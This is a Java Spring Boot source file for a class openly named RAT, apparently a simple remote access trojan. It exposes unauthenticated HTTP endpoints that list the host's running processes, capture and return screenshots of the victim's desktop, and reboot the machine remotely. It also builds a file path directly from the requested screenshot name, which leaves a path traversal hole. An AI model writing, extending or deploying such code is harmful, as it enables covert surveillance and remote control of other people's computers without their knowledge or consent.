package rat.rat;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.bind.annotation.PathVariable;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.http.MediaType;
import java.net.*;
import java.io.*;
import java.util.*;
import java.awt.*;

import java.awt.AWTException;
import java.awt.image.*;
import javax.imageio.*;


@RestController
@RequestMapping("/RAT")
public class RAT {

    @GetMapping("/getprocesses")
    public String getProcesses() {
        String line;
        String processes = "";
        try {
            Process p = Runtime.getRuntime().exec("ps");
            BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));

            // Reading all teh processes them and adding them to the processes string
            while ((line = input.readLine()) != null) {
                processes = processes + line + "\n";
            }
            input.close();
        }catch (Exception e){
            return "An error occured while reading the processes of the remote system";
        }
        return processes;
    }

    @GetMapping(path = "/takescreenshot/{screenshotName}", produces = MediaType.IMAGE_JPEG_VALUE)
    public byte[] takeScreenshot(@PathVariable("screenshotName")String screenshotName) throws AWTException, IOException {
        // Taking the screenshot
         try {
            String pathToImage = "./screenshots/" + screenshotName + ".jpg";
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            BufferedImage capture = new Robot().createScreenCapture(screenRect);
            ImageIO.write(capture, "jpg", new File(pathToImage));
            FileInputStream fileIn = new FileInputStream(pathToImage);
	    int fileSize = fileIn.available();
            byte[] bytes = new byte[fileSize];
	    fileIn.read(bytes);
	    fileIn.close();
	    return bytes;
        } catch (Exception e) {
        }
        byte[] empty = {};
        return empty;
    }

    @GetMapping("/reboot/{waitingTime}")
    public String reboot(@PathVariable("waitingTime")int waitingTime) {
        try {
            // Invoking the reboot command
            Runtime r = Runtime.getRuntime();
            r.exec("shutdown -r -t " + waitingTime);
        } catch(Exception e) {
            return "An error occured while executing the reboot command";
        }
        return "The remote system will reboot after " + waitingTime + " seconds";
    }
}

